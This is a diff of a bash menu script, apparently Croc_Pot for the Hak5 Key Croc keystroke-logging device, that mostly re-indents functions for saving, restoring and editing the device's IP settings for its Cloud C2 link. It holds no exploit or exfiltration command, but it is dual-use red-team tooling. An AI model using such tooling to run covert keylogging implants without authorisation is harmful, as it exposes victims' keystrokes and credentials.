 	ip r | grep default | sed -e 's/default//g' -e 's/via//g' -e 's/dev//g' -e 's/wlan0//g' -e 's/^[[:space:]]*//g' | tee -a ${cloud_ip}
 }
-
-	if [ -e "${cloud_ip}" ]; then
+if [ -e "${cloud_ip}" ]; then
 	echo -ne "\n\e[40m$(ColorGreen 'C2_IP.txt file already exists')\n${clear}"
 	echo -ne "\e[40m$(ColorBlue 'REMOVE EXISTING AND SAVE NEW SETUP TYPE YES OR NO AND PRESS [ENTER] ')${clear}"; read existing_ip
 	case $existing_ip in
 	[yY] | [yY][eE][sS])
-						echo -ne "\n\e[40m$(ColorRed 'REMOVING EXISTING SETUP AND SAVING NEW')\n${clear}"
-						rm ${cloud_ip}
-						run_save_v ;;
-		[nN] | [nN][oO])
-						echo -ne "\n\e[40m$(ColorYellow 'KEEPING EXISTING SETUP')\n${clear}" ;;
-					  *)
-						invalid_entry ; save_ip ;;
+		echo -ne "\n\e[40m$(ColorRed 'REMOVING EXISTING SETUP AND SAVING NEW')\n${clear}"
+		rm ${cloud_ip}
+		run_save_v ;;
+	[nN] | [nN][oO])
+		echo -ne "\n\e[40m$(ColorYellow 'KEEPING EXISTING SETUP')\n${clear}" ;;
+	*)
+		invalid_entry ; save_ip ;;
 	esac
 else
-						echo -ne "\n\e[40m$(ColorYellow 'SAVING SETUP IP TO TOOLS/CROC_POT')\n${clear}"
-						run_save_v
+		echo -ne "\n\e[40m$(ColorYellow 'SAVING SETUP IP TO TOOLS/CROC_POT')\n${clear}"
+		run_save_v
 fi
 }
-
 ##
-#   - Hak5 Cloud_C2 restore ip to first setup
-#   - restore ip just for this session
+#----Hak5 Cloud_C2 restore ip to first setup
+#----restore ip just for this session
 ##
-
 restore_ip() {
 	echo -ne "\n\e[40m$(ColorYellow 'This will restore keycroc IP back to the IP when C2 was frist setup')\n${clear}"
-	if [ -e "${cloud_ip}" ]; then
+if [ -e "${cloud_ip}" ]; then
 	echo -ne "\e[40m$(ColorYellow 'Keycroc IP will change to this IP now  ')$(sed -n 1p ${cloud_ip})\n${clear}"
 	echo -ne "\e[40m$(ColorYellow 'Will need to start new ssh with this IP')$(sed -n 1p ${cloud_ip})\n${clear}"
 	echo -ne "\e[40m$(ColorBlue 'CHANGE KEYCROC IP TYPE YES OR NO AND PRESS [ENTER] ')${clear}"; read change_ip
 	case $change_ip in
 	[yY] | [yY][eE][sS])
-						ifconfig wlan0 $(sed -n 1p ${cloud_ip}) netmask $(sed -n 2p ${cloud_ip}); route add default gw $(sed -n 3p ${cloud_ip}) wlan0; ;;
-		[nN] | [nN][oO])
-						echo -ne "\n\e[40m$(ColorYellow 'KEEPING EXISTING SETUP')\n${clear}" ;;
-					  *)
-						invalid_entry ; save_ip ;;
+		ifconfig wlan0 $(sed -n 1p ${cloud_ip}) netmask $(sed -n 2p ${cloud_ip}); route add default gw $(sed -n 3p ${cloud_ip}) wlan0; ;;
+	[nN] | [nN][oO])
+		echo -ne "\n\e[40m$(ColorYellow 'KEEPING EXISTING SETUP')\n${clear}" ;;
+	*)
+		invalid_entry ; save_ip ;;
 	esac
 else
 	echo -ne "\n\e[40m$(ColorRed 'DID NOT FIND ANY SAVED C2 SETTING PLEASE RUN #1 SAVE C2 SETUP IP')\n${clear}"
 	run_save_v
 fi
 }
-
 ##
-#   - Hak5 Cloud_C2 edit the ip to use for C2
+#----Hak5 Cloud_C2 edit the ip to use for C2
 ##
-
 edit_ip() {
 	echo -ne "\n\e[40m$(ColorYellow 'Manually Enter IP,Netmask,Gateway for your keycroc')\n${clear}"
 	echo -ne "\e[40m$(ColorBlue 'CHANGE KEYCROC IP TYPE YES OR NO AND PRESS [ENTER] ')${clear}"; read ip_user
 	case $ip_user in
 	[yY] | [yY][eE][sS])
-						echo -ne "\e[40m$(ColorBlue 'ENTER IP TO BE USED AND PRESS [ENTER] ')${clear}"; read ip_e
-						echo -ne "\e[40m$(ColorBlue 'ENTER NETMASK TO BE USED AND PRESS [ENTER] ')${clear}"; read mask_e
-						echo -ne "\e[40m$(ColorBlue 'ENTER GATEWAY TO BE USED AND PRESS [ENTER] ')${clear}"; read gate_e
-						ifconfig wlan0 ${ip_e} netmask ${mask_e}; route add default gw ${gate_e} wlan0; ;;
-	    [nN] | [nN][oO])
-						echo -ne "\n\e[40m$(ColorYellow 'KEEPING EXISTING SETUP')\n${clear}" ;;
-					  *)
-						invalid_entry ; save_ip ;;
+		echo -ne "\e[40m$(ColorBlue 'ENTER IP TO BE USED AND PRESS [ENTER] ')${clear}"; read ip_e
+		echo -ne "\e[40m$(ColorBlue 'ENTER NETMASK TO BE USED AND PRESS [ENTER] ')${clear}"; read mask_e
+		echo -ne "\e[40m$(ColorBlue 'ENTER GATEWAY TO BE USED AND PRESS [ENTER] ')${clear}"; read gate_e
+		ifconfig wlan0 ${ip_e} netmask ${mask_e}; route add default gw ${gate_e} wlan0; ;;
+	[nN] | [nN][oO])
+		echo -ne "\n\e[40m$(ColorYellow 'KEEPING EXISTING SETUP')\n${clear}" ;;
+	*)
+		invalid_entry ; save_ip ;;
 	esac
 }
-
-MenuTitle  SAVE C2 SETUP IP MENU
+##
+#----Hak5 C2 ip restore Menu
+##
+MenuTitle SAVE C2 SETUP IP MENU
 MenuColor 1 SAVE C2 SETUP IP ; echo -ne "   ${clear}\n"
 MenuColor 2 RESTORE C2 SETUP IP ; echo -ne "${clear}\n"
 MenuColor 3 EDIT CROC IP ; echo -ne "      ${clear}\n"
@@ -5324,11 +5024,9 @@ MenuEnd
 	*) invalid_entry ; save_ip ;;
 	esac
 }
-
 ##
-#   - Hak5 Cloud_C2 menu
+#----Hak5 Cloud_C2 menu
 ##
-
 MenuTitle HAK5 CLOUD C2 MENU
 MenuColor 1 HAK5 C2 SETUP ; echo -ne "      ${clear}\n"
 MenuColor 2 START HAK5 C2 ; echo -ne "      ${clear}\n"
@@ -5357,11 +5055,9 @@ MenuEnd
 	*) invalid_entry ; hak_cloud ;;
 	esac
 }
-
 ##
-#   - Croc_Pot Main Menu
+#----Croc_Pot Main Menu
 ##
-
 function main_menu() {
 	LED B
 	clear
